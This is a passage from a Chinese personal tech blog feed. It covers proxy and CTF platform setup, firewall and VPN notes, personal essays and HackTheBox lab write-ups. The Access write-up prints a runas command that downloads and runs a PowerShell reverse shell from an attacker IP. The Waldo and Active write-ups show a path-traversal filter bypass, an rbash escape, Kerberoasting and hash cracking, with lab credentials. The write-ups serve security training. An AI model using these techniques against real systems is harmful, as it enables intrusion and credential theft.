multiverse</span><br></pre></td></tr></table></figure><p>配置好正确的DNS服务器，确保解析到的地址正确</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/resolv.conf</span><br><span class="line"></span><br><span class="line">nameserver 125.71.5.43</span><br></pre></td></tr></table></figure><p>更新apt缓存外加安装代理所需依赖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update </span><br><span class="line">sudo apt-get install python-gevent python-pip vim screen shadowsocks</span><br><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure><p>启动shadowsocks的代理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohup sslocal -s ip -p port -k &quot;password&quot; -b 127.0.0.1 -l 1080 &amp;</span><br></pre></td></tr></table></figure><p>再安装将socks5代理转换为http代理的polipo</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install polipo</span><br></pre></td></tr></table></figure><p>接着修改polipo的配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/polipo/config</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logSyslog = true</span><br><span class="line">logFile = /var/log/polipo/polipo.log</span><br><span class="line"></span><br><span class="line">proxyAddress = &quot;0.0.0.0&quot;</span><br><span class="line"></span><br><span class="line">socksParentProxy = &quot;127.0.0.1:1080&quot;</span><br><span class="line">socksProxyType = socks5</span><br><span class="line"></span><br><span class="line">chunkHighMark = 50331648</span><br><span class="line">objectHighMark = 16384</span><br><span class="line"></span><br><span class="line">serverMaxSlots = 64</span><br><span class="line">serverSlots = 16</span><br><span class="line">serverSlots1 = 32</span><br></pre></td></tr></table></figure><p>重启polipo服务并且配置环境代理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/polipo restart</span><br><span class="line">export http\_proxy=&quot;http://127.0.0.1:8123/&quot;</span><br><span class="line">export https\_proxy=&quot;http://127.0.0.1:8123/&quot;</span><br></pre></td></tr></table></figure><p>到这步就配置完代理了，可以curl一下google试试正不正常。</p><h3 id="STEP2：部署fbctf平台"><a href="#STEP2：部署fbctf平台" class="headerlink" title="STEP2：部署fbctf平台"></a>STEP2：部署fbctf平台</h3><p>项目地址：<a href="https://github.com/facebook/fbctf">https://github.com/facebook/fbctf</a></p><p>先pull下来源码，然后直接安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/facebook/fbctf</span><br><span class="line">cd fbctf</span><br><span class="line">source ./extra/lib.sh</span><br><span class="line">quick\_setup install prod</span><br></pre></td></tr></table></figure><h3 id="STEP3：维护fbctf平台"><a href="#STEP3：维护fbctf平台" class="headerlink" title="STEP3：维护fbctf平台"></a>STEP3：维护fbctf平台</h3><h3 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h3><p><a href="https://github.com/NS-Sp4ce/FBCTF-Chinese-Version">https://github.com/NS-Sp4ce/FBCTF-Chinese-Version</a></p><p>记得在Custombranding.php里面把汉化信息去了</p><h3 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h3><p>去申请个证书，要有crt和key文件。</p><p>然后编辑<code>/etc/nginx/sites-available/fbctf.conf</code>将证书目录修改为实际目录即可</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CC攻击防御手段</title>
      <link href="8c6a4238e915/"/>
      <url>8c6a4238e915/</url>
      
        <content type="html"><![CDATA[<p><strong>从连接数方面针对</strong></p><p>iptables -I INPUT -p tcp –dport 80 -m connlimit –connlimit-above 500 -j DROP</p><p>iptables -I INPUT -p tcp –dport 443 -m connlimit –connlimit-above 500 -j DROP</p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.10.10.98 Access</title>
      <link href="99011e72ad66/"/>
      <url>99011e72ad66/</url>
      
        <content type="html"><![CDATA[<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://ss64.com/nt/runas.html">https://ss64.com/nt/runas.html</a></p><p><a href="https://forum.hackthebox.eu/discussion/1135/access">https://forum.hackthebox.eu/discussion/1135/access</a></p><h3 id="Detail"><a href="#Detail" class="headerlink" title="Detail:"></a>Detail:</h3><p>这台机子是一台windows，开放了三个端口：21   23   80</p><p>首先看一下ftp，发现里面有两个文件。一个加密了的<a href="https://wp.jinzz.cc/wp-content/uploads/2018/12/Access-Control.zip">Access Control.zip</a>，zip里面有一个pst文件。还有一个<a href="https://wp.jinzz.cc/wp-content/uploads/2018/12/backup.zip">backup.mdb</a></p><p>mdb是access数据库的文件，打开把所有的表都过一遍，有了发现。</p><p><img src="/images/1-1.png"></p><p>尝试拿access4u@security这个密码去试一下解压压缩包。</p><p>果然是可以的，我们解压得到的<a href="https://wp.jinzz.cc/wp-content/uploads/2018/12/Access-Control-1.zip">Access Control.pst</a>是一个outlook的数据文件，拿outlook打开看一下。</p><p><img src="/images/2.png"></p><p>发现里面提供了一个帐号和密码</p><p>security<br>4Cc3ssC0ntr0ller</p><p>我们尝试用这一套帐号密码去登录23端口的Telnet</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181209043508.png"></p><p>登陆成功。</p><p>翻一下每个用户的Desktop，发现在security的桌面上有user.txt。</p><p><img src="/images/4.png"></p><p>同时发现在Public这个用户的桌面上有一个快捷方式。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181209043837.png"></p><p>发现这个快捷方式用runas.exe去执行了一个access.exe。</p><p>值得注意的有，它使用了/savecred这个参数。</p><p>其实这个runas命令类似于命令行下的使用管理员执行。</p><p>如果不带/savecred这个参数，那么之后需要输入管理员的帐号密码，而只要输入正确一次，之后就可以不输入，直接/savecred，我们就可以利用这个方式来提权。</p><p>我们直接通过runas的方法用管理员的权限去执行一个powershell的反弹shell脚本，先在攻击机上挂好<a href="https://wp.jinzz.cc/wp-content/uploads/2018/12/Invoke-PowerShellTcp.zip">Invoke-PowerShellTcp</a>。然后在目标机器上执行以下命令下载ps脚本并运行反弹shell。</p><p>runas /user:ACCESS\Administrator /savecred “powershell IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://10.10.14.12/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp">http://10.10.14.12/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp</a> -Reverse -IPAddress 10.10.14.12 -port 443”</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181209044503.png"></p><p>root.txt get √</p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.10.10.87 Waldo</title>
      <link href="ce16cd0f412e/"/>
      <url>ce16cd0f412e/</url>
      
        <content type="html"><![CDATA[<p>感谢 @<a href="https://forum.hackthebox.eu/profile/Baikuya">Baikuya</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://forum.hackthebox.eu/discussion/968/hint-for-waldo</span><br><span class="line"></span><br><span class="line">https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/     逃离restrict bash jail</span><br><span class="line"></span><br><span class="line">https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/   找到可用的高权限命令</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/supermenxxx/article/details/50853778    纠正环境变量</span><br></pre></td></tr></table></figure><h3 id="Detail"><a href="#Detail" class="headerlink" title="Detail"></a>Detail</h3><p>这台机子只开放了80和22端口。</p><p>web页面截图如下所示：</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181206162411.png"></p><p>里面是一个类似于小留言板一样的应用，可以增删改list。</p><p>burpsuit抓包模拟一下流程。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181206162648.png"></p><p>可以看到，这个application尝试去读取list的时候是直接取读取的文件，也就是说这些内容都是文件的形式存储的。</p><p>注意到我们发送的请求这里有   path=./.list/   很自然的去想到更改这里试一下。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181206164455.png"></p><p>可以看到当前目录下有很多文件，值得注意的是有一个fileRead.php 和我们现在用到的dirRead.php</p><p>尝试用它去读取/etc/passwd</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181206164907.png"></p><p>然而并不可以，返回了错误值，那我们就读一下这个php文件本身，看看为什么不行。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181206164848.png"></p><p>返回的文件是json，里面有很多的转义字符，读起来有点难受。</p><p>用bash整理一下转义字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat dirty | sed &#x27;s/\\\\n/\\n/g&#x27; | sed &#x27;s/\\\\//g&#x27; &gt; clean\_file</span><br></pre></td></tr></table></figure><p>我们可以得到以下输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($\_SERVER\[&#x27;REQUEST\_METHOD&#x27;\] === &quot;POST&quot;)&#123;</span><br><span class="line">$fileContent\[&#x27;file&#x27;\] = false;</span><br><span class="line">header(&#x27;Content-Type: application/json&#x27;);</span><br><span class="line">if(isset($\_POST\[&#x27;file&#x27;\]))&#123;</span><br><span class="line">header(&#x27;Content-Type: application/json&#x27;);</span><br><span class="line">$\_POST\[&#x27;file&#x27;\] = str\_replace( array(&quot;../&quot;, &quot;..&quot;&quot;), &quot;&quot;, $\_POST\[&#x27;file&#x27;\]);</span><br><span class="line">if(strpos($\_POST\[&#x27;file&#x27;\], &quot;user.txt&quot;) === false)&#123;</span><br><span class="line">$file = fopen(&quot;/var/www/html/&quot; . $\_POST\[&#x27;file&#x27;\], &quot;r&quot;);</span><br><span class="line">$fileContent\[&#x27;file&#x27;\] = fread($file,filesize($\_POST\[&#x27;file&#x27;\]));  </span><br><span class="line">fclose();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo json\_encode($fileContent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这个文件特意将../和..都进行了删除</p><p>../../../../../../../../../../../../etc/passwd就会被过滤掉变成了/var/www/html/etc/passwd,所以无法被读取。</p><p>然而，在这个过滤机制中，他只对过滤进行了一次验证，不会对第一次过滤后的结果再进行过滤验证。所以我们可以通过一些方法来绕过，比如把../../../../../../../../../../../../etc/passwd 改成 …/./…/./…/./…/./…/./…/./…/./来bypass这一过滤手段。</p><p>…/./…/./…/./…/./…/./…/./…/./etc/passwd变成了../../../../../../../etc/passwd这样就能正确绕过过滤。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181206170530.png"></p><p>这样我们就能正确的读取文件了，同时我们发现/etc/passwd显示存在一个可以登陆的nobody用户。</p><p>我们去他的目录下看一下有没有什么线索。</p><p><img src="/images/TIM%E5%9B%BE%E7%89%8720181206170803.png"></p><p>发现user.txt和一些其他文件，这样我们就直接获得了user flag</p><p>进一步探索我们可以发现.ssh文件里居然存放了一份ssh私匙，读取下载。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181206171125.png"></p><p>老样子用上面的命令过滤一下该文件，然后ssh登陆上去。</p><p>ssh -i .monitor <a href="mailto:&#110;&#x6f;&#98;&#111;&#100;&#x79;&#x40;&#49;&#48;&#46;&#x31;&#x30;&#46;&#49;&#48;&#46;&#56;&#55;">&#110;&#x6f;&#98;&#111;&#100;&#x79;&#x40;&#49;&#48;&#46;&#x31;&#x30;&#46;&#49;&#48;&#46;&#56;&#55;</a></p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181206171254.png"></p><p>成功ssh上去了，进一步观察，我们发现似乎还有一个用户可以使用该私匙登录。</p><p><img src="/images/TIM%E5%9B%BE%E7%89%8720181206171723.png"></p><p>根据known_hosts和authorized_keys我们可以发现，该用户似乎登陆过 monitor@localhost</p><p><img src="/images/TIM%E5%9B%BE%E7%89%8720181206171926.png"></p><p>而且似乎我们登陆上的这台machine的本地22端口是被映射到了其他machine的，或者是这台box有特殊的其他软件，可以像docker一样有多个环境运行。</p><p>那我们去试一下，这份私匙是不是也可以登录到localhost。</p><p>ssh -i .monitor monitor@localhost</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181206172244.png"></p><p>成功的登陆了上去，但是我们发现有rbash的jail。我们的一些常用命令都不能够使用。</p><p>这边我们可以通过 red 即 restrict ed 来 break the jail。</p><p>类似于 vim nano 和 ed 这一类文本编辑器其实都内置了执行命令的功能。</p><p>我们可以利用这些特性来bypass rbash的限制。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">monitor@waldo:~$ red</span><br><span class="line">!&#x27;/bin/sh&#x27;</span><br><span class="line">export PATH=$PATH:/bin/:/sbin/</span><br><span class="line">export PATH=$PATH:/usr/bin:/usr/sbin/</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181206174719.png"></p><p>之后的步骤我以前也没了解过，看了论坛才知道，我们可以通过getcap这个指令来查看是否有一些程序拥有类似于root权限的功能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181206174832.png"></p><p>可以看到这边有一个很奇怪的命令叫 tac 实际上就是倒写的cat 有读取全局文件的功能，我们可以直接通过它来读取/root/root.txt的内容。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181206175027.png"></p><p>root flag get √</p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.10.10.100 Active</title>
      <link href="492629f7613e/"/>
      <url>492629f7613e/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.hackthebox.eu/home/machines/profile/148">https://www.hackthebox.eu/home/machines/profile/148</a></p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://forum.hackthebox.eu/discussion/944/active-any-hints">https://forum.hackthebox.eu/discussion/944/active-any-hints</a><br><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a><br><a href="https://cfdb.io/Windows/Weak/_SPN/_Password">https://cfdb.io/Windows/Weak\_SPN\_Password</a></p><p>NMAP扫描结果 ： <a href="https://wp.jinzz.cc/wp-content/uploads/2018/12/active.zip">active</a></p><p>端口扫描结果来看，开放了很多端口，但是绝大多数都不能直接access。</p><p>发现开放了smb协议的端口，看看有没有可以access的share folders。enum4linux扫一哈。</p><p><img src="/images/TIM%E5%9B%BE%E7%89%8720181204231522.png"></p><p>发现存在Replication这么一个共享文件夹是匿名可以访问查看的。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181204231930.png"></p><p>查看了一番，发现里面存在一个包含了关键信息的<strong>Groups.xml</strong></p><p><img src="/images/1.png"></p><p>里面的cpassword正是用户SVC_TGS的密码。</p><p>cpassword可以通过gp3finder工具来解密。<a href="https://wp.jinzz.cc/wp-content/uploads/2018/12/gp3finder.zip">gp3finder</a></p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181204232406.png"></p><p>得到user SVC_TGS的密码。</p><p>这时候可以用该用户的凭据获得初级权限。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181204233553.png"></p><p>之后去看了看论坛才有的思路，是要使用一个叫<strong>Impacket</strong>的工具来获得hash。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC\_TGS:GPPstillStandingStrong2k18 -request</span><br></pre></td></tr></table></figure><p>填入相应的domain和帐号密码，记得加上request，然后就可以获得帐号hash</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181204233858.png"></p><p>之后使用hashcat去跑密码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -m 13100 -w 3 -a 0 C:\\Users\\37406\\Desktop\\krb5.txt C:\\Users\\37406\\Desktop\\rockyou.txt</span><br></pre></td></tr></table></figure><p>PS：记得别在虚拟机上跑，因为是暴力破解，所以要耗很多的资源，CPU比GPU效率低得多。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181204235607.png"></p><p>administrator的密码<strong>get√</strong></p><p><img src="/images/TIM%E5%9B%BE%E7%89%8720181204235900.png"></p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10.10.10.3 Lame</title>
      <link href="ec5ec2593d2b/"/>
      <url>ec5ec2593d2b/</url>
      
        <content type="html"><![CDATA[<p><a href="https://wp.jinzz.cc/wp-content/uploads/2018/12/Lame.pdf">https://wp.jinzz.cc/wp-content/uploads/2018/12/Lame.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Location</title>
      <link href="2e98f15f0b2c/"/>
      <url>2e98f15f0b2c/</url>
      
        <content type="html"><![CDATA[<h2 id="国内"><a href="#国内" class="headerlink" title="国内"></a><strong>国内</strong></h2><p>云南大理抚仙湖</p><p>云南洱海-双廊-半岛纳海海景客栈</p><p>成都四姑娘山</p><p>四川理县浮云牧场</p><p>吉林长白山天池</p><h2 id="国外"><a href="#国外" class="headerlink" title="国外"></a><strong>国外</strong></h2><p>芬兰罗瓦涅米树屋酒店</p>]]></content>
      
      
      <categories>
          
          <category> 想法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用PPTP/L2TP异地组网</title>
      <link href="585429ee926e/"/>
      <url>585429ee926e/</url>
      
        <content type="html"><![CDATA[<p>参考链接：<a href="https://ubuntuforums.org/showthread.php?t=1622931">https://ubuntuforums.org/showthread.php?t=1622931</a></p><p>首先搭建好一台位于公网的pptp/l2tp server</p><p>客户端A连接上之后server端出现ppp0 interface</p><p><img src="/images/TIM%E5%9B%BE%E7%89%8720181012172155.png"></p><p>客户端B连接上之后server端出现ppp1 interface</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20181012172252.png"></p><p>如果没有添加iptables转发规则，二者通信的数据包会被gateway就是server丢弃</p><p>server端需要添加</p><p>iptables –table nat –append POSTROUTING –out-interface ppp0 –jump MASQUERADE<br>iptables –table nat –append POSTROUTING –out-interface ppp1 –jump MASQUERADE</p><p>转发二者之间的数据包。</p><p>iptables –table nat –delete POSTROUTING –out-interface ppp0 –jump MASQUERADE<br>iptables –table nat –delete POSTROUTING –out-interface ppp1 –jump MASQUERADE</p><p>断开连接时需要取消转发。</p><p>分别向/etc/ppp/ip-up和/etc/ppp/ip-down中添加脚本可以做到每当建立起一个ppp连接时自动向iptables添加规则。</p><p>/etc/ppp/ip-up</p><p>#!/bin/sh<br>REMOTE_IP_ADDRESS=$5<br>date &gt; /var/run/ppp-${REMOTE_IP_ADDRESS}.up<br>iptables –table nat –append POSTROUTING –out-interface ${PPP_IFACE} –jump MASQUERADE<br>exit 0</p><p>/etc/ppp/ip-down</p><p>#!/bin/sh<br>REMOTE_IP_ADDRESS=$5<br>iptables –table nat –delete POSTROUTING –out-interface ${PPP_IFACE} –jump MASQUERADE<br>rm -f /var/run/ppp-${REMOTE_IP_ADDRESS}.up<br>exit 0</p><p> </p><h2 id="windows客户端添加静态路由实现非传统VPN"><a href="#windows客户端添加静态路由实现非传统VPN" class="headerlink" title="windows客户端添加静态路由实现非传统VPN"></a>windows客户端添加静态路由实现非传统VPN</h2><p>参考链接:<a href="https://www.experts-exchange.com/articles/11931/Automatic-VPN-routes-configuration-for-PPTP-in-Windows-7-8.html">https://www.experts-exchange.com/articles/11931/Automatic-VPN-routes-configuration-for-PPTP-in-Windows-7-8.html</a></p><p>首先取消勾选 在远程网络上使用默认网关 这个选项</p><p><img src="/images/BPHS2USKTH@4TJSQNC.png"></p><p>然后</p><p>mkdir C:\ProgramData\Microsoft\Network\Connections\Cm\vpnname<br>cd C:\ProgramData\Microsoft\Network\Connections\Cm\vpnname</p><p>注意把vpnname替换成想要的名字</p><p>然后创建一个添加默认路由的脚本</p><p>notepad routes.netsh</p><p>interface ipv4<br>add route prefix=192.168.17.0/24 interface=”vpnname” store=active<br>exit</p><p>然后在每次vpn连接的时候都要自动启动这个脚本，通过事件管理器添加计划任务。</p><p>Win+R 启动 eventvwr.exe</p><p>应用程序和服务日志 &gt; Microsoft &gt; Windows &gt; Networkprofile &gt; Opreational</p><p>如果之前有连接过那个vpn的话这边会出现一个事件ID为10000的log</p><p><img src="/images/MQ4SV8RLTMQ1QHUCZ00.png"></p><p>把这个作为事件触发器</p><p>右键这个log，将任务附加到此事件，让这个事件作为一个任务的触发器。</p><p><img src="/images/OXFNL51325IQ8ROZ3.png"></p><p>选项这么填</p><p>netsh.exe</p><p>exec routes.netsh</p><p>C:\ProgramData\Microsoft\Network\Connections\Cm\FarpostVPN\</p><p>点确定就OK了</p><p>然后在弹出的计划任务窗口记得勾选以最高权限运行，配置文件调成windows10</p><p>然后把只有在以下网络可用时才启动选成相应的vpn连接。</p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>微观宏观以及决定论</title>
      <link href="c8ec4b27faf3/"/>
      <url>c8ec4b27faf3/</url>
      
        <content type="html"><![CDATA[<p>写这种东西感觉怪中二的，但花很多时间思考过的东西，不记吧太难受，写一下吧还是。 首先其实一切都是从微观和宏观的定义讲起。 宏观世界，就是正常认知到的这个世界，举个很简单的日子，你抛出一个小球，可以肉眼观察到小球的运动轨迹，根据其物理性质，会表现处不同的视觉特性，比如先是在空中划出一道抛物线，落到地上根据自身材质，会弹跳出不同的轨迹。因为我们生活在宏观世界，所以微观世界的很多概念因为我们的生活经验很难去想象和接受。我们出生到死亡，观察世界，得到绝大多数信息的来源都是通过视觉，但是视觉只是很多种sence中的其中一种，蝙蝠和海豚就能通过超声波来观察世界，所以二者观察到的世界是十分不同的。同样的，用观察宏观世界的观测方法来观测微观世界是很困难的，不可行的，我们人类观测微观世界就需要借助一些精密的仪器，通过某种间接的现象来观测解释，而无法直接通过肉眼来观测，自然的，微观世界也较难为我们直观所理解。 起因就是和Samuel讨论，这个世界到底是一切都是确定好了的还是不确定的。我得出的结论是这个世界的一切都是确定好的，因为假设自由意识不存在的情况下，物质的一切变化都是能够通过微观粒子的运动来解释的。如果能过通过某种方式掌握所有微观粒子的当前的位置和矢量，就理论上能预测未来发生的事了。 然而实际上这个假说本身就是有问题的，因为微观世界不同于宏观世界，微观世界的运动没有那么简单容易让我们去想象，实际上根据正态分布和傅立叶变换能画一张图表，那张图表的运动就说明了一件事情，你越是确定一个微观粒子的位置，你越不能确定他的矢量。这种性质在我们的视觉想象中很难去构建一个模型，但是这确实是实验得到的微观性质。</p><p><img src="/images/M20180924_180107_786.jpg"></p><p>延伸开来还牵扯到了一个光的波粒二象性，就是说微观粒子都是存在粒子的特性和波的特性的，详见光的双缝干涉实验。如果你想要想象微观光的样子，那是不可能的，因为你会自然而然的套用你的视觉感官去想象。 实际上是讲了一个道理，光子的运动他不是想宏观运动，他本身不存在一个动的过程，光子实际上可以同时出现在宇宙的任何地方，只是出现在很极端的地方的几率特别小而已。也就是说你是观测不到光子像一个球一样到处飞的状况的，他是一个普朗克时间可能出现在那个位置，下一个普朗克时间可能出现在另一个位置，而出现的几率如果用概率分布图来展现是符合波的特性的。所以存在波粒二象性。所以，光是粒子，又具有波的特性。</p>]]></content>
      
      
      <categories>
          
          <category> 想法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>获取当天最新的所有中国IP地址范围</title>
      <link href="9b085b12f85f/"/>
      <url>9b085b12f85f/</url>
      
        <content type="html"><![CDATA[<p>curl -s <a href="http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest">http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest</a> | grep “CN” | grep “ipv4” | cut -d “|” -f 4,5 &gt;&gt; raw<br>sed -i “s/67108864/6/g” raw<br>sed -i “s/33554432/7/g” raw<br>sed -i “s/16777216/8/g” raw<br>sed -i “s/8388608/9/g” raw<br>sed -i “s/4194304/10/g” raw<br>sed -i “s/2097152/11/g” raw<br>sed -i “s/1048576/12/g” raw<br>sed -i “s/524288/13/g” raw<br>sed -i “s/262144/14/g” raw<br>sed -i “s/131072/15/g” raw<br>sed -i “s/65536/16/g” raw<br>sed -i “s/32768/17/g” raw<br>sed -i “s/16384/18/g” raw<br>sed -i “s/8192/19/g” raw<br>sed -i “s/4096/20/g” raw<br>sed -i “s/2048/21/g” raw<br>sed -i “s/1024/22/g” raw<br>sed -i “s/512/23/g” raw<br>sed -i “s/256/24/g” raw<br>sed -i “s#|#/#g” raw<br>mv raw china_ip.txt</p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>终极的浪漫</title>
      <link href="f1d8d4b5003d/"/>
      <url>f1d8d4b5003d/</url>
      
        <content type="html"><![CDATA[<p>环太平洋这部电影里面有一个设定，叫做通感。因为机甲太过庞大和复杂，单单一个人类驾驶员的大脑精神力不够承受这个负担，所以需要两个驾驶员通过通感，将自己的记忆和另一个人的记忆相融合，形成一种默契和共同感知。</p><p>这个设定真的很棒，某种意义上来说，人类都是孤独的，都是不能相互理解的，每个个体都是自私的，都有自己的记忆，动机和理由。通感这个东西，因为是将两个人的记忆相互融合，也就是说，你小时候到现在，经历过的事，所有的记忆和情感，我都能统统感受到，理解到，体验到，同样的，我的秘密，我的人生经历和体会，你也同样都能领会，理解。</p><p>而我为什么是我？你为什么是你？如果灵魂，独立意志这些东西不存在，那么唯一可以区分你和我的东西，形成人格品质的东西就只有你和我之间的记忆了。通感打破了你我记忆之间的这一层隔阂，使你变成了我，我又变成了你，你不是你，我不是我，我们都变成了你我。从此你我都不在孤独，真真正正的有了一个懂我，了解我的人，也有一个懂你，了解你的人。哇，真的超级他妈浪漫，还有什么能比这个更浪漫的？</p><p>现在的所有感情，恋爱，婚姻，都是或多或少建立在两性激素，金钱交易上的，同睡一张床，两个心冷冰冰。我想这不是我想要的感情。而正是因为现在不存在，也许也永远不会存在的通感这个东西，使这个想法，这个Idea变得真正的浪漫，因为不存在。</p>]]></content>
      
      
      <categories>
          
          <category> 想法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Centos7更换下载源</title>
      <link href="d8da6a062976/"/>
      <url>d8da6a062976/</url>
      
        <content type="html"><![CDATA[<h2 id="Centos5"><a href="#Centos5" class="headerlink" title="Centos5"></a>Centos5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.cloud.tencent.com/repo/centos5_base.repo</span><br></pre></td></tr></table></figure><h2 id="Centos6"><a href="#Centos6" class="headerlink" title="Centos6"></a>Centos6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.cloud.tencent.com/repo/centos6_base.repo</span><br></pre></td></tr></table></figure><h2 id="Centos7"><a href="#Centos7" class="headerlink" title="Centos7"></a>Centos7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.cloud.tencent.com/repo/centos7_base.repo</span><br></pre></td></tr></table></figure><h2 id="Centos8"><a href="#Centos8" class="headerlink" title="Centos8"></a>Centos8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.cloud.tencent.com/repo/centos8_base.repo</span><br></pre></td></tr></table></figure><h2 id="添加epel-源"><a href="#添加epel-源" class="headerlink" title="添加epel 源"></a>添加epel 源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install epel-release</span><br><span class="line">rpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-7.rpm</span><br></pre></td></tr></table></figure><h2 id="更新缓存"><a href="#更新缓存" class="headerlink" title="更新缓存"></a>更新缓存</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自动备份文件和数据库的Script</title>
      <link href="3a912c17e67a/"/>
      <url>3a912c17e67a/</url>
      
        <content type="html"><![CDATA[<h2 id="https-github-com-jinzizhe-Server-File-Auto-Backup"><a href="#https-github-com-jinzizhe-Server-File-Auto-Backup" class="headerlink" title="https://github.com/jinzizhe/Server-File-Auto-Backup"></a><a href="https://github.com/jinzizhe/Server-File-Auto-Backup">https://github.com/jinzizhe/Server-File-Auto-Backup</a></h2><p> </p><p>#!/bin/bash</p><p>echo “+————————————————————————+”<br>echo “| Server Data Auto Backup Script |”<br>echo “+————————————————————————+”<br>echo “| A tool to auto-compress &amp; auto-upload data to FTP server |”<br>echo “+————————————————————————+”<br>echo “| <a href="https://github.com/jinzizhe/Server-File-Auto-Backup/">https://github.com/jinzizhe/Server-File-Auto-Backup/</a> |”<br>echo “+————————————————————————+”</p><p>if [ -e “/backup/config” ];then</p><p>day=$(cat /backup/config | grep “day” | cut -d “:” -f 2)<br>FTPIP=$(cat /backup/config | grep “FTPIP” | cut -d 